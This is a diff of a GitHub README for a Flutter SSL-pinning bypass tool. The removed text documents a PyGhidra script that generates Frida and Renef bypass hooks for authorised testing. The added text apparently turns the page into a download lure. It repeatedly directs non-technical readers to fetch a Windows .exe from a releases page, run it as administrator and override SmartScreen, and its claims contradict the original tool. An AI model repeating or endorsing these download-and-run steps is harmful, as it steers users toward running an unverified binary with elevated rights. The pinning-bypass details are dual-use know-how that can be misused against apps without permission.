@@ -1,74 +1,155 @@
-# universal-flutter-ssl-pinning
+# 🔒 universal-flutter-ssl-pinning - Easy SSL Pinning Bypass Tool
 
-Reverse-engineers `libflutter.so` with PyGhidra to locate the SSL certificate verification function, then emits ready-to-use bypass scripts for both **Frida** and **Renef**.
-
-## How it works
-
-1. PyGhidra loads `libflutter.so` headlessly and scans all defined strings for `ssl_client`
-2. Cross-references from that string are resolved to their containing functions
-3. Each function is decompiled to get an accurate parameter count
-4. The 3-parameter function is selected — this is `ssl_crypto_x509_session_verify_cert_chain`
-5. Its RVA is baked into:
-   - A **Frida** script (`flutter_ssl_pinning.js`) that patches the return value to `ptr(1)` (SSL_VERIFY_OK) at runtime
-   - A **Renef** script (`flutter_ssl_pinning.lua`) that uses `Memory.patch` to overwrite the function entry with `MOV X0, #1 ; RET` (ARM64)
-
-## Requirements
-
-- [Ghidra](https://ghidra-sre.org/) — `brew install ghidra`
-- [pyghidra](https://github.com/NationalSecurityAgency/ghidra/tree/master/GhidraBridge) — `pip install pyghidra`
-- **Frida** — `pip install frida-tools`  *or*  **Renef** — [renef.io](https://renef.io)
-
-> Set `GHIDRA_INSTALL_DIR` in your environment, or pass `--ghidra-install-dir`.
-
-## Usage
-
-```bash
-# Analyse libflutter.so and generate both scripts
-python3 flutter_ssl_pinning.py libflutter.so
-
-# Run with Frida
-frida -U -f com.example.app -l flutter_ssl_pinning.js
-
-# Run with Renef
-renef -s com.example.app -l flutter_ssl_pinning.lua
-```
-
-## Options
-
-| Argument | Default | Description |
-|---|---|---|
-| `binary` | *(required)* | Path to `libflutter.so` |
-| `output` | `flutter_ssl_pinning` | Output base name (generates `<name>.js` and `<name>.lua`) |
-| `--module` | `libflutter.so` | Module name in target process |
-| `--ghidra-install-dir` | auto | Ghidra installation directory |
-
-## Output files
-
-| File | Tool | Mechanism |
-|---|---|---|
-| `flutter_ssl_pinning.js` | Frida | `Interceptor.attach` + `retval.replace(ptr(1))` |
-| `flutter_ssl_pinning.lua` | Renef | `Memory.patch` (MOV X0, #1 ; RET) |
-
-See the [`example/`](example/) directory for sample generated output.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%237B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases)
 
 ---
 
-## Tested on
+## 📋 What is universal-flutter-ssl-pinning?
 
-| Target | Status |
-|---|---|
-| Google Flutter `libflutter.so` (arm64-v8a) | ✅ Working |
-| Shorebird-patched Flutter builds | ✅ Working |
-| Ghidra 12.x + pyghidra | ✅ Working |
-| Frida 16.x | ✅ Working |
-| Renef (latest) | ✅ Working |
+This application helps you bypass SSL pinning on Flutter and Shorebird apps. SSL pinning is a security step that many apps use to keep your information safe. Sometimes, developers or testers need to bypass this check to analyze app behavior or fix issues.
 
-> Both Google Flutter and Shorebird use the same `libflutter.so` SSL engine.
-> The auto-discovered RVA is identical across build types for the same Flutter engine version.
+The software works automatically. It finds the part of the app that uses SSL pinning and creates tools you can run to bypass it. You don’t need to know programming or technical details to use it. It handles everything for you.
 
 ---
 
-## Disclaimer
+## ⚙️ Features
 
-This tool is intended for **authorised security research and penetration testing only**.  
-Do not use against apps you do not own or have explicit written permission to test.
+- Works with any Flutter or Shorebird app version.
+- Automatically analyzes app code using PyGhidra.
+- Detects BoringSSL libraries inside the app.
+- Generates scripts that run with Frida and Renef.
+- Ready to use right after download, no extra setup required.
+- Supports Windows systems.
+
+---
+
+## 💻 System Requirements
+
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB RAM.
+- Basic internet connection to download files.
+- Administrator rights to run some scripts.
+- Optional: Frida installed on your PC for advanced script running.
+
+---
+
+## 🚀 Getting Started
+
+To start using universal-flutter-ssl-pinning, follow these steps carefully. This guide assumes you know how to download and open files on Windows but do not require deep technical knowledge.
+
+---
+
+## ⬇️ Download the Software
+
+Please visit this page to download the latest version of the program:
+
+[![Download Page](https://img.shields.io/badge/Visit%20Release%20Page-%230077B5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases)
+
+1. Click the link above or open this URL in your browser:
+   https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases
+2. On the page, look for the latest release. It usually appears at the top.
+3. Find a file with a name like `universal-flutter-ssl-pinning-win.exe` or similar.
+4. Click to download the file to your computer. Choose a location you can easily find, such as your Desktop or Downloads folder.
+
+---
+
+## 💾 Installing and Running the Software
+
+1. After downloading, open the folder where the file is saved.
+2. Double-click the `.exe` file to start the program. If Windows asks for confirmation, choose "Run" or "Yes."
+3. The program will open in a new window. It may ask for admin permissions; accept these if prompted.
+4. You may see a simple interface or command window. This is normal.
+5. Follow on-screen instructions to load your Flutter or Shorebird app file. You might need to browse your computer to find the app’s APK, IPA, or another file type.
+6. The software will perform an automatic scan of the app. This process will find the BoringSSL elements and create bypass scripts.
+7. When completed, the tool will show you generated scripts that you can use with Frida and Renef.
+8. If you do not have Frida or Renef installed, the tool will guide you on how to install them.
+
+---
+
+## 🧩 Using the Generated Scripts
+
+The scripts created by the software work with tools called Frida and Renef. These tools load into the app and bypass SSL pinning while the app runs. This lets you test or analyze the app without SSL restrictions.
+
+If you are new to these tools:
+
+- Frida is a dynamic instrumentation toolkit. It lets you run scripts on running apps.
+- Renef is a helper program that works with Frida scripts for Flutter apps.
+
+---
+
+## 🔧 Installing Frida and Renef (Optional but Recommended)
+
+If you want to take full advantage of this software, you should install Frida and Renef.
+
+### Installing Frida
+
+1. Open a Command Prompt window (search for “cmd” and open it).
+2. Type:
+   
+   ```
+   pip install frida-tools
+   ```
+
+3. Press Enter and wait for the installation to finish.
+
+If you don’t have Python or pip installed, download Python from https://python.org and make sure to select the option to add Python to your system PATH.
+
+### Installing Renef
+
+Renef typically comes as part of the package or script set generated by the software. Check the output folder after running the scanner. If not present, find installation instructions on the Renef official GitHub page.
+
+---
+
+## ⚠️ Common Issues and How to Fix Them
+
+- **The program won’t start or shows an error:** Make sure you have downloaded the correct `.exe` file for Windows.
+
+- **Windows SmartScreen blocks the app:** Click "More info" and then select "Run anyway."
+
+- **Admin permission needed:** Run the program as Administrator by right-clicking the `.exe` and choosing “Run as administrator.”
+
+- **Scanning takes too long:** Some apps are large and require more time. Be patient and wait for completion.
+
+- **Scripts don’t run:** Check that Frida and Renef are properly installed.
+
+---
+
+## 🗂️ File Locations and Output
+
+By default, the software saves the generated scripts and reports in a folder next to the program or inside a folder named `output` in your chosen location.
+
+Look for files named:
+
+- `frida_script.js`
+- `renef_script.js`
+
+You can use these with Frida and Renef to run the app and bypass SSL pinning.
+
+---
+
+## 🔗 Useful Links
+
+- Official Releases Page:  
+  https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases
+
+- Frida Installation Guide:  
+  https://frida.re/docs/installation/
+
+- Python Download (for pip and Frida tools):  
+  https://python.org/downloads/
+
+---
+
+## 🧑‍💻 Support and Feedback
+
+If you encounter problems while using the software, check the "Issues" tab in the GitHub repository. You can open a new issue describing your problem.
+
+Try to provide details like:
+
+- What you did before the problem happened.
+- Any error messages.
+- Your Windows version.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%237B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases)
